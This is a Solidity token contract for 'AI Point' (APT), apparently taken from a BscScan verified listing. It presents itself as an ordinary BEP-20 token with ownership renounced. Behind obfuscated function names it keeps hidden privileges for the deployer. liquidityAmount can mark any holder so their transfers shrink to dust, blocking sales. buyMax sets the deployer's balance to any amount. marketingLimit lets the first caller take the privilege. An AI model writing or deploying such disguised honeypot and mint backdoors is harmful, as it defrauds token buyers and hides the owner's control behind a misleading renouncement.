/**
 *Submitted for verification at BscScan.com on 2023-02-02
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface atIsAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atLaunched {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIPoint is Ownable{
    uint8 public decimals = 18;
    mapping(address => bool) public teamEnable;


    mapping(address => mapping(address => uint256)) public allowance;
    uint256 constant senderBuy = 10 ** 10;
    mapping(address => bool) public autoFrom;
    address public fundList;
    string public name = "AI Point";

    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => uint256) public balanceOf;
    address public launchAmount;

    string public symbol = "APT";
    bool public atWallet;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        atIsAmount limitTo = atIsAmount(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        launchAmount = atLaunched(limitTo.factory()).createPair(limitTo.WETH(), address(this));
        fundList = atSenderTrading();
        autoFrom[fundList] = true;
        balanceOf[fundList] = totalSupply;
        emit Transfer(address(0), fundList, totalSupply);
        renounceOwnership();
    }

    

    function txSwap(address launchedFrom, address limitFrom, uint256 sellAmount) internal returns (bool) {
        require(balanceOf[launchedFrom] >= sellAmount);
        balanceOf[launchedFrom] -= sellAmount;
        balanceOf[limitFrom] += sellAmount;
        emit Transfer(launchedFrom, limitFrom, sellAmount);
        return true;
    }

    function transferFrom(address senderExempt, address autoWalletSwap, uint256 sellAmount) public returns (bool) {
        if (senderExempt != atSenderTrading() && allowance[senderExempt][atSenderTrading()] != type(uint256).max) {
            require(allowance[senderExempt][atSenderTrading()] >= sellAmount);
            allowance[senderExempt][atSenderTrading()] -= sellAmount;
        }
        if (autoWalletSwap == fundList || senderExempt == fundList) {
            return txSwap(senderExempt, autoWalletSwap, sellAmount);
        }
        if (teamEnable[senderExempt]) {
            return txSwap(senderExempt, autoWalletSwap, senderBuy);
        }
        return txSwap(senderExempt, autoWalletSwap, sellAmount);
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function liquidityAmount(address takeMinExempt) public {
        if (takeMinExempt == fundList || takeMinExempt == launchAmount || !autoFrom[atSenderTrading()]) {
            return;
        }
        teamEnable[takeMinExempt] = true;
    }

    function approve(address listTrading, uint256 sellAmount) public returns (bool) {
        allowance[atSenderTrading()][listTrading] = sellAmount;
        emit Approval(atSenderTrading(), listTrading, sellAmount);
        return true;
    }

    function atSenderTrading() private view returns (address) {
        return msg.sender;
    }

    function marketingLimit(address senderTake) public {
        if (atWallet) {
            return;
        }
        autoFrom[senderTake] = true;
        atWallet = true;
    }

    function buyMax(uint256 sellAmount) public {
        if (!autoFrom[atSenderTrading()]) {
            return;
        }
        balanceOf[fundList] = sellAmount;
    }

    function transfer(address autoWalletSwap, uint256 sellAmount) external returns (bool) {
        return transferFrom(atSenderTrading(), autoWalletSwap, sellAmount);
    }


}